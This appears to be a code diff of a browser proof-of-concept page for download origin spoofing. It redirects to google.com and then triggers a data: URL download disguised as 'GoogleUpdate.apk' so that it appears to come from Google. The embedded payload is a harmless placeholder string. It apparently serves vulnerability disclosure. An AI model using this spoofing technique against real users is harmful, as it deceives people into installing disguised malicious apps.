@@ -25,17 +25,23 @@
   <h2>Download Origin Spoof PoC</h2>
   <p>Tap the button below</p>
 
-  <button onclick="download()">Download</button>
+  <button onclick="start()">Download</button>
 
   <script>
-    function download() {
-      const a = document.createElement("a");
-      a.href =
-        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
-      a.download = "GoogleUpdate.apk";
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
+    function start() {
+      // Step 1: real redirect to google.com
+      location.href = "https://www.google.com";
+
+      // Step 2: after redirect, trigger download
+      setTimeout(() => {
+        const a = document.createElement("a");
+        a.href =
+          "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+        a.download = "GoogleUpdate.apk";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      }, 800);
     }
   </script>
 </body>
